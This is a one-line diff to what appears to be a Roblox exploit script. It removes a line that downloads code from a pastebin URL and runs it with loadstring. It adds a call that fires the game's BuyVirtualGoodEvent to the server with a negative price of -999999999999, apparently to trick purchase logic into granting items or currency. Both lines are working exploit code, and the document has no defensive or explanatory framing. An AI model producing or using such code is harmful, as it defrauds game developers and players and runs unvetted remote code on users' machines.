@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/pkfpwtnn", true))()
+game:GetService("ReplicatedStorage").Events.BuyVirtualGoodEvent:FireServer("ScooterPastelBlue", -999999999999)
